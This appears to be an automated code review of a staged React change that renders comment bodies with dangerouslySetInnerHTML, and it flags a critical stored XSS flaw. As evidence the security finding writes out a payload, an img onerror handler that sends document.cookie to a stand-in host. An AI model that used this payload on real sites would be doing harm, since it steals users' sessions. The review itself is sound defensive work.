**Scope:** staged (git diff --cached)

## Intent

**Intent:** inferred: render each comment's body under its author in `CommentList`, with newlines shown as line breaks (diff).
**Requirements:** none stated.
**Scope creep:** not judged: no source states a requirement.
**Sources not read:** none.

## What Was Done Well

- The change is small and focused: one new element in the component, and a test that is updated to match.
- The test name now says what it checks, and it asserts the body text as well as the author.
- The list keeps its stable `key={comment.id}`.

## Findings

### Security — Critical

**Location:** `src/components/CommentList.tsx:9`
**Issue:** `comment.body` is injected as raw HTML through `dangerouslySetInnerHTML`. The only processing is replacing `\n` with `<br>`, so nothing escapes or sanitizes the HTML.
**Evidence:** A comment whose `body` is `<img src=x onerror="fetch('//evil.example/?c='+document.cookie)">` is passed to `CommentList` → React writes the string into the `<p>` with `innerHTML` → the `onerror` handler runs in every viewer's session (stored XSS), exposing cookies and tokens and allowing actions as that user. Verification searched the repository for a sanitizer (`sanitize`, `DOMPurify`) and for other callers of `CommentList`. It found none, and `package.json` has no sanitizer dependency. The `body: string` type does not constrain the content, and the React "JSX escapes text" precedent excludes `dangerouslySetInnerHTML` explicitly.
**Confidence:** High
**Fix:** Render the body as text, so React escapes it. Either use `<p style={{ whiteSpace: 'pre-line' }}>{comment.body}</p>`, or split on `\n` and interleave `<br />` elements. If the body must support HTML, sanitize it with an allow-list sanitizer such as DOMPurify before it reaches `__html`.

### Tests/Coverage — Suggestion

**Location:** `src/components/CommentList.test.tsx:6-9`
**Issue:** The updated test only renders the single-line body `'Hello'`. It does not cover the new newline-to-`<br>` behavior, and it does not cover a body that contains HTML.
**Evidence:** A body such as `'a\nb'` or `'<b>x</b>'` is never rendered in the test → a regression in the line-break handling, or an HTML injection like the Critical finding above, passes the suite unnoticed.
**Confidence:** High
**Fix:** Add a case with a multi-line body that asserts the line break. Add a case with an HTML payload that asserts it appears as text, not as an element.

## Summary

| Category              | Critical | Warning | Suggestion | N/A |
|-----------------------|----------|---------|------------|-----|
| Security              | 1        | 0       | 0          |     |
| Performance           | 0        | 0       | 0          |     |
| Tests/Coverage        | 0        | 0       | 1          |     |
| Architecture          | 0        | 0       | 0          |     |
| Code & File Size      | 0        | 0       | 0          |     |
| Potential Bugs        | 0        | 0       | 0          |     |
| Accessibility         | 0        | 0       | 0          |     |
| Observability         |          |         |            | N/A |
| API Design            |          |         |            | N/A |
| Resilience            |          |         |            | N/A |
| DB Migrations         |          |         |            | N/A |
| Concurrency           |          |         |            | N/A |
| i18n                  |          |         |            | N/A |
| Privacy/Compliance    |          |         |            | N/A |
| Architecture Patterns |          |         |            | N/A |
| Stack-Specific        | 0        | 0       | 0          |     |
| **Total**             | **1**    | **0**   | **1**      |     |

**Verification:** 1 Critical/Warning candidate checked, 0 refuted.

**Review effort:** 1/5 — up to 50 changed lines in 2 files; no risk area.
**Relevant tests:** changed — `src/components/CommentList.test.tsx` renders one comment and asserts that the author `Ada` and the body `Hello` appear; it does not cover multi-line bodies or bodies that contain HTML. Execution: not run.
**Look first:** `src/components/CommentList.tsx` (raw HTML injection of `comment.body`), `src/components/CommentList.test.tsx` (no test for newlines or HTML bodies).
**Ready to merge:** No — 1 Critical finding must be fixed before merging.

## Audit

**Files reviewed:** 2 of 2 changed files: `src/components/CommentList.test.tsx`, `src/components/CommentList.tsx`.
**Read for context:** `package.json`, `skill:references/accessibility.md`, `skill:references/intent.md`, `skill:stacks/react.md`, `skill:stacks/typescript.md`, `tsconfig.json`, `vitest.config.ts`.
**Checked with no findings:** Performance, Architecture, Code & File Size, Potential Bugs, Accessibility, Stack-Specific.
**Not verified:** nothing.
